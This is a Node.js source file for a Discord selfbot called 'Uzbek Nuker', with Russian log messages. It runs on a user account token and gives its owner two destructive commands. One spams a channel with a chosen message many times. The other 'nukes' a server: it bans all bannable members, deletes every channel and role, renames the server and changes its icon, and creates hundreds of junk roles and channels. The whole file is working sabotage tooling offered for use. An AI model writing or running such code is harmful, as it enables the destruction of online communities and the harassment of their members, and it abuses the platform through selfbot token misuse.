const Discord = require('discord.js-selfbot');
const colors = require('colors/safe');
const { userid, token, prefix } = require('./config.json')
const title = require('node-bash-title');
const client = new Discord.Client();



client.on('ready', () => {



    console.clear()
    client.user.setActivity("Uzbek Self Bot", { type: "WATCHING" })
    title(`Uzbek Nuker | ${client.user.tag}`)
    console.log(colors.brightWhite(' ═════════════════════════════════════════════════════════'))
    console.log(colors.brightWhite(` User: ${client.user.tag}`))
    console.log(colors.brightWhite(` Allowed ID: ${userid}`))
    console.log(colors.brightWhite(` Prefix: ${prefix}`))
    console.log(colors.brightWhite(' ═════════════════════════════════════════════════════════\n'))
})



client.on('message', async message => {
    const args = message.content.trim().split(/ +/g);

    if (message.content.startsWith(prefix + 'spam')) {



        if (userid.includes(message.author.id)) {
            const count = args[1]
            if (isNaN(count)) return message.channel.send('Укажи число')
            if (!count) return message.channel.send('Укажи количество сообщений для спама')
            const messagee = message.content.split(" ").slice(2).join(" ")
            if (!message) return message.channel.send('Укажи сообщение для спама')
            await message.delete()
            console.log(colors.brightWhite(` [LOG] Спам в канал ${message.channel.name} запущен! будет отправлено ${count} сообщений`))

            for (let i = 0; i < count; i++) {
                message.channel.send(messagee)


            }
        }
    }
    if (message.content === prefix + 'ping') {
        message.channel.send(client.ws.ping)
        await message.delete()

    }


    if (message.content === prefix + 'nuke') {
        function randint(min, max) {
            return Math.floor(Math.random() * (max - min + 1) + min);
        }

        if (userid.includes(message.author.id)) {
            console.log(colors.brightWhite(` [LOG] Краш сервера ${message.guild.name} начался`))
            console.log(colors.brightWhite(` [LOG] Баню всех участников...`))
            //бан
            await message.delete()
            message.guild.members.fetch().then(members => {

                members.forEach(member => {
                    if (member.bannable && member.id !== client.user.id) {
                        member.ban().catch(e => { console.log(colors.brightRed(` [LOG] Не могу забанить ${member.user.tag}`)) })
                    }
                })

            })

            console.log(colors.brightWhite(` [LOG] Удаляю все каналы...`))
            //Удаление
            message.guild.channels.cache.forEach(channel => channel.delete().catch(e => { return console.log(colors.brightRed(` [LOG] Не могу удалить ${channel.name}`)) }))


            console.log(colors.brightWhite(` [LOG] Меняю название сервера...`))
            //название
            await message.guild.setName("Crash by dinaxu");

            console.log(colors.brightWhite(` [LOG] Меняю аватарку сервера...`))
            //ава
            await message.guild.setIcon("https://media.discordapp.net/attachments/977099622348619816/985351738817146940/scale_1200.jpeg");
            // Удаление ролей 
            console.log(colors.brightWhite(` [LOG] Удаляю роли...`))

            message.guild.roles.cache.forEach(role => {
                if (role.name !== "@everyone") {
                    role.delete().catch(e => { console.log(colors.brightRed(` [LOG] Не могу удалить ${role.name}`)) })
                }
            })
            //роли создание
            console.log(colors.brightWhite(` [LOG] Создаю роли...`))

            for (let i = 0; i < 125; i++) {
                message.guild.roles.create({
                    data: {
                        name: `Crash by dinaxu-` + randint(1, 500), color: "#00E1FF",
                    }
                })
            }

            console.log(colors.brightWhite(` [LOG] Создаю каналы...`))
            //Создание
            for (let i = 0; i < 300; i++) {
                message.guild.channels.create(`crash-by-dinaxu-` + randint(1, 500), { type: "GUILD_TEXT" }).catch(e => { return console.log(colors.brightRed(' [LOG] Не могу создать канал!')) })
            }
        }
    }


})

client.login(token);
